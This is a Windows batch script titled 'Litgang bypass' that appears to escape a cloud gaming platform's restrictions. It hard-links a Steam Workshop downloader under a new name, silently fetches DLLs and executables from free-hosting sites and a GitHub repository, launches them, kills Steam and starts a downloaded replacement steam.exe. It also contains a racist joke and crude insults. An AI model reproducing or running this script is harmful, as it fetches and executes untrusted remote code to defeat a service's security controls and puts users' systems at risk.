@ECHO OFF 
TITLE Litgang bypass
COLOR 
MD "B:\Lit" >NUL 2>&1 
SETLOCAL 
CALL :setESC 

IF EXIST "B:\Lit\GfnDownloader.exe" (GOTO :installed) >NUL 2>&1 

ECHO %ESC%[42mInitializing GNF!%ESC%[0m 
IF NOT EXIST "C:\Program Files (x86)\Steam\steamapps\common\SteamVR" (GOTO :ERROR) >NUL 2>&1 
IF NOT EXIST "C:\Program Files (x86)\Steam\steamapps\workshop\content\250820\2365394934\downloader.exe" (GOTO :ERROR) >NUL 2>&1 
CD "C:\Program Files (x86)\Steam\steamapps\workshop\content\250820\2365394934"

%HOMEDRIVE%
MKLINK /H "C:\Program Files (x86)\Steam\fucknvidia.exe" downloader.exe
SET DL="C:\Program Files (x86)\Steam\fucknvidia.exe" >NUL 2>&1 
B: 
CD B:\Lit
ECHO Downloading Litgang! Thanks to Jacob, Tested, and black people.. JK LOL! GOT U
TIMEOUT 10 /NOBREAK >NUL
%DL% -LJOk "https://testedhub.000webhostapp.com/Geforce/DiscordRPC.dll" >NUL 2>&1
%DL% -LJOk "https://testedhub.000webhostapp.com/Geforce/Guna.UI2.dll" >NUL 2>&1
%DL% -LJOk "https://testedhub.000webhostapp.com/Geforce/Newtonsoft.Json.dll" >NUL 2>&1
%DL% -LJOk "https://testedhub.000webhostapp.com/Geforce/gabeutility.dll" >NUL 2>&1
%DL% -LJOk "https://github.com/TehTested/scripts/blob/main/gabeutilityx.exe?raw=true" >NUL 2>&1
START "" "B:\Lit\GfnDownloader.exe" >NUL 2>&1 

MD "B:\Lit\Steam" >NUL 2>&1 
CD "B:\Lit\Steam" 
%DL% -LJOk "https://server.pwet.us/steam.exe" >NUL 2>&1 
%DL% -LJOk "https://server.pwet.us/nircmdc.exe" >NUL 2>&1 
NIRCMDC.EXE KILLPROCESS STEAM.EXE >NUL 2>&1 
START "" "B:\Lit\Steam\steam.exe" >NUL 2>&1 


EXIT 

:error 
CLS 
ECHO %ESC%[41mIF you see this error, then your breath smells like poo shid fart dart.%ESC%[0m  
ECHO.
ECHO %ESC%[90mPress any key to exit.%ESC%[0m
PAUSE >NUL 
EXIT 

:installed
CLS 
ECHO %ESC%[46mYou have already installed Gaybe!%ESC%[0m  
ECHO.
ECHO %ESC%[90mPress any key to exit.%ESC%[0m
PAUSE >NUL 
EXIT 

:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
  exit /B 0
)
exit /B 0


C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:dir\test.exe dir\Program.cs
